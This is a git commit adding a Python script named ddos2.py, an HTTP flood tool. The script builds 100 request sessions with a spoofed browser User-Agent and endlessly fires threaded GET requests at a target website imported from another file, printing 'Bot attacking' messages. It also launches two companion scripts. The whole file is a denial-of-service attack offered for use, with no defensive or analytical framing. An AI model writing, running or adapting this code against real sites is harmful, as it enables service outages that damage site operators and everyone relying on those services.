35ea56f76405f0cfe7a436ec76a10904de365ad3
Hertz <106058099+yuhertz@users.noreply.github.com>
2024-03-05 09:02:52 +0800

    Create ddos2.py

---
+++ ddos2.py
@@ -0,0 +1,40 @@
+import requests
+import threading
+import subprocess
+from main import target_website
+
+def run_script(script_name):
+    subprocess.Popen(["python", script_name])
+
+if __name__ == "__main__":
+    run_script("main.py")
+    run_script("main2.py")
+
+
+def create_bots():
+    bots = []
+    for i in range(100):
+        bot = requests.Session()
+        bot.headers.update({"User-Agent": "Mozilla/5.0"})
+        bots.append(bot)
+    return bots
+
+def send_request(bot):
+    try:
+        response = bot.get(target_website)
+        print(f"Bot attacking {target_website}. Response status code: {response.status_code}")
+    except:
+        print("Error during bot attack")
+
+def ddos_attack():
+    bots = create_bots()
+    while True:
+        threads = []
+        for bot in bots:
+            t = threading.Thread(target=send_request, args=(bot,))
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join()
+
+ddos_attack()
